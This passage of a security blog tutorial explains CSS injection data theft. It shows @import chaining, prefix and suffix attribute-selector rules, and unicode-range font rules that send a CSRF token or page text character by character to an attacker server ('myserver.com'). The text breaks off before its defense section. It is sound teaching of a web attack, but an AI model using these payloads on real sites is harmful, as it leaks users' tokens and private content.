<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>Stealing Data with CSS - CSS Injection (Part 2) - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="google-adsense-account" content="ca-pub-1121865251398741">



            
<link href="https://blog.huli.tw/2022/09/29/css-injection-2/" rel="alternate" hreflang="zh-TW" />
            
    




    
<link rel="canonical" href="https://blog.huli.tw/2022/09/29/en/css-injection-2/">
    





    <meta name="description" content="In Part 1, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS inject">
<meta property="og:type" content="article">
<meta property="og:title" content="Stealing Data with CSS - CSS Injection (Part 2)">
<meta property="og:url" content="https://blog.huli.tw/2022/09/29/en/css-injection-2/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="In Part 1, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS inject">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/css-injection-2/cover-en.png">
<meta property="article:published_time" content="2022-09-29T12:41:10.000Z">
<meta property="article:modified_time" content="2023-12-12T12:05:30.208Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/css-injection-2/cover-en.png">



<link rel="alternative" href="/atom.xml" title="Stealing Data with CSS - CSS Injection (Part 2)" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#stealing-all-characters">1&nbsp;&nbsp;<b>Stealing All Characters</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#stealing-one-character-at-a-time-is-too-slow-isnt-it">2&nbsp;&nbsp;<b>Stealing one character at a time is too slow, isn’t it?</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#stealing-other-things">3&nbsp;&nbsp;<b>Stealing other things</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#unicode-range">3.1&nbsp;&nbsp;unicode-range</a>
                    
                    
                    
                    <a class="navbar-item" href="#font-height-difference-first-line-scrollbar">3.2&nbsp;&nbsp;Font height difference + first-line + scrollbar</a>
                    
                    
                    
                    <a class="navbar-item" href="#ultimate-move-ligature-scrollbar">3.3&nbsp;&nbsp;Ultimate move: ligature + scrollbar</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#defense">4&nbsp;&nbsp;<b>Defense</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#summary">5&nbsp;&nbsp;<b>Summary</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/09/29/css-injection-2/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Stealing Data with CSS - CSS Injection (Part 2)
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-09-29T12:41:10.000Z" itemprop="datePublished">29 September 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <img src="/img/css-injection-2/cover.png" style="display:none" loading="lazy">

<p>In <a href="/2022/09/29/en/css-injection-1">Part 1</a>, we learned the basic principle of stealing data with CSS and successfully stole the CSRF token as a practical example using HackMD. This article will delve into some details of CSS injection and address the following issues:</p>
<ol>
<li>Since HackMD can load new styles without refreshing the page, how can we steal the second character and beyond on other websites?</li>
<li>If we can only steal one character at a time, will it take a long time? Is this feasible in practice?</li>
<li>Is it possible to steal things other than attributes? For example, text content on a page or even JavaScript code?</li>
<li>What are the defense mechanisms against this attack?</li>
</ol>
<span id="more"></span>

<h2><span id="stealing-all-characters">Stealing All Characters</span></h2><p>As we mentioned in Part 1, the data we want to steal may change after refreshing the page (such as the CSRF token), so we must load new styles without refreshing the page.</p>
<p>The answer to this problem is given in <a target="_blank" rel="noopener" href="https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf">CSS Injection Attacks</a>: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/@import">@import</a>.</p>
<p>In CSS, you can use <code>@import</code> to import other styles from external sources, just like <code>import</code> in JavaScript.</p>
<p>We can use this feature to create a loop that imports styles, as shown in the following code:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/start?len=8<span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Then, the server returns the following style:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=1<span class="token punctuation">)</span></span>
@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=2<span class="token punctuation">)</span></span>
@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=3<span class="token punctuation">)</span></span>
@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=4<span class="token punctuation">)</span></span>
@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=5<span class="token punctuation">)</span></span>
@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=6<span class="token punctuation">)</span></span>
@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=7<span class="token punctuation">)</span></span>
@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=8<span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The key point is that although 8 are imported at once, “the server will hang for the next 7 requests and not respond”, and only the first URL <code>https://myserver.com/payload?len=1</code> will return a response, which is the payload for stealing data mentioned earlier:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="a"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=a<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">input[name="secret"][value^="b"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=b<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">input[name="secret"][value^="c"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=c<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">//....

input[name="secret"][value^="z"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=z<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>When the browser receives the response, it will first load the CSS above, and after loading, elements that meet the conditions will send requests to the backend. Assuming the first character is d, the server will then return the response of <code>https://myserver.com/payload?len=2</code>, which is:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="da"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=da<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">input[name="secret"][value^="db"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=db<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">input[name="secret"][value^="dc"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=dc<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">//....

input[name="secret"][value^="dz"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=dz<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This process can be repeated to send all characters to the server, relying on the feature that <code>import</code> will load resources that have already been downloaded and then wait for those that have not yet been downloaded.</p>
<p>One thing to note here is that you will notice that the domain we load the style from is <code>myserver.com</code>, while the domain of the background image is <code>b.myserver.com</code>. This is because browsers usually have a limit on the number of requests that can be loaded from a single domain at the same time. Therefore, if you use only <code>myserver.com</code>, you will find that the request for the background image cannot be sent out and is blocked by CSS import.</p>
<p>Therefore, two domains need to be set to avoid this situation.</p>
<p>In addition, this method is not feasible in Firefox because even if the response of the first request comes back, Firefox will not update the style immediately. It will wait for all requests to return before updating. The solution can be found in <a target="_blank" rel="noopener" href="https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/">CSS data exfiltration in Firefox via a single injection point</a>. Remove the first import step and wrap each character’s import in an additional style, like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=1<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=2<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=3<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=4<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=5<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=6<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=7<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">@import <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com/payload?len=8<span class="token punctuation">)</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The above code works fine in Chrome, so we can change it to the above code to support both browsers.</p>
<p>To summarize, using the <code>@import</code> CSS feature allows us to “dynamically load new styles without reloading the page” and thus steal every character from behind.</p>
<h2><span id="stealing-one-character-at-a-time-is-too-slow-isnt-it">Stealing one character at a time is too slow, isn’t it?</span></h2><p>If we want to execute this type of attack in the real world, we may need to improve efficiency. For example, in HackMD, the CSRF token has a total of 36 characters, so we need to send 36 requests, which is too many.</p>
<p>In fact, we can steal two characters at a time because, as mentioned in the previous section, there are suffix selectors in addition to prefix selectors. Therefore, we can do this:</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">input[name="secret"][value^="a"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=a<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">input[name="secret"][value^="b"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver.com/leak?q=b<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">// ...
input[name="secret"][value$="a"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=a<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span>

<span class="token selector">input[name="secret"][value$="b"]</span> <span class="token punctuation">&#123;</span>
  <span class="token property">border-background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://b.myserver2.com/suffix?q=b<span class="token punctuation">)</span></span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In addition to stealing the beginning, we also steal the end, which immediately doubles the efficiency. It is important to note that the CSS for the beginning and end uses different properties, <code>background</code> and <code>border-background</code>, respectively. If we use the same property, the content will be overwritten by others, and only one request will be sent in the end.</p>
<p>If there are not many characters that may appear in the content, such as 16, we can directly steal two beginnings and two ends at a time, and the total number of CSS rules is <code>16*16*2</code> &#x3D; 512, which should still be within an acceptable range and can speed up the process by another two times.</p>
<p>In addition, we can also improve towards the server side, such as using HTTP&#x2F;2 or even HTTP&#x2F;3, which have the opportunity to speed up the loading speed of requests and improve efficiency.</p>
<h2><span id="stealing-other-things">Stealing other things</span></h2><p>Besides stealing attributes, is there any way to steal other things? For example, other text on the page? Or even the code in the script?</p>
<p>According to the principle we mentioned in the previous section, it is impossible to do so. The reason we can steal attributes is that the “attribute selector” allows us to select specific elements, and in CSS, there is no selector that can select “text content”.</p>
<p>Therefore, we need to have a deeper understanding of CSS and styles on the webpage to achieve this seemingly impossible task.</p>
<h3><span id="unicode-range">unicode-range</span></h3><p>In CSS, there is a property called “unicode-range”, which can load different fonts for different characters. For example, the following example is taken from <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/unicode-range">MDN</a>:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"Ampersand"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token function">local</span><span class="token punctuation">(</span><span class="token string">"Times New Roman"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+26<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 4em<span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> Ampersand<span class="token punctuation">,</span> Helvetica<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>Me &amp; You = Us<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The unicode of <code>&amp;</code> is <code>U+0026</code>, so only the character <code>&amp;</code> will be displayed in a different font, and the others will use the same font.</p>
<p>Front-end engineers may have used this trick, for example, to use different fonts to display English and Chinese. This trick can also be used to steal text on the page, like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f1"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=1<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+31<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f2"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=2<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+32<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"f3"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=3<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+33<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fa"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=a<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+61<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fb"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=b<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+62<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"fc"</span><span class="token punctuation">;</span>
        <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>https://myserver.com?q=c<span class="token punctuation">)</span></span><span class="token punctuation">;</span>
        <span class="token property">unicode-range</span><span class="token punctuation">:</span> U+63<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>

      <span class="token selector">div</span> <span class="token punctuation">&#123;</span>
        <span class="token property">font-size</span><span class="token punctuation">:</span> 4em<span class="token punctuation">;</span>
        <span class="token property">font-family</span><span class="token punctuation">:</span> f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f3<span class="token punctuation">,</span> fa<span class="token punctuation">,</span> fb<span class="token punctuation">,</span> fc<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
    Secret: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>ca31a<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>If you check the network tab, you will see a total of 4 requests sent:</p>
<p><img src="/img/css-injection-2/p1.png" alt="network"></p>
<p>With this trick, we can know that there are 13ac four characters on the page.</p>
<p>The limitation of this trick is obvious:</p>
<ol>
<li>We don’t know the order of the characters.</li>
<li>We don’t know the repeated characters.</li>
</ol>
<p>However, thinking about how to steal characters from the perspective of “loading fonts” has really brought a new way of thinking to many people and has developed various other methods.</p>
<h3><span id="font-height-difference-first-line-scrollbar">Font height difference + first-line + scrollbar</span></h3><p>This trick mainly solves the problem encountered in the previous trick: “cannot know the order of the characters”. This trick combines many details, and there are many steps, so you need to listen carefully.</p>
<p>First, we can actually not load external fonts and leak out characters using built-in fonts. How can we do this? We need to find two sets of built-in fonts with different heights.</p>
<p>For example, there is a font called “Comic Sans MS”, which is higher than another font called “Courier New”.</p>
<p>For example, assuming that the default font height is 30px and Comic Sans MS is 45px. Now we set the height of the text block to 40px and load the font, like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
